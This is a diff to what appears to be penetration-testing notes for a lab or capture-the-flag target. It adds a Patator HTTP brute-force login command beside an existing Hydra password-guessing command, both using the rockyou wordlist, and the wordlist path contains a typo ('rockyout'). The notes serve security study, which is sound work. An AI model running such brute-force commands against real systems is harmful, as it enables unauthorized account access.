@@ -25,6 +25,7 @@
   * [Password Guessing](#password-guessing) 
     * [Default Credentials](#default-credentials)
     * [Hydra](#hydra)
+    * [Patator](#patator)
   * [CVE-2021-1234](#cve-2021-1234) 
     * [EDB-ID-56789](#edb-id-56789)
     * [cyberphor POC](#cyberphor-poc)
@@ -267,6 +268,11 @@ hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form "/phpmy
 
 # output
 NSTR
+```
+
+### Patator
+```bash
+patator http_fuzz url=http://$TARGET/$LOGIN method=POST body='username=FILE0&password=FILE1' 0=usernames.txt 1=/usr/share/wordlists/rockyout.txt -x ignore:fgrep=Unauthorized
 ```
 
 ## CVE-2021-1234
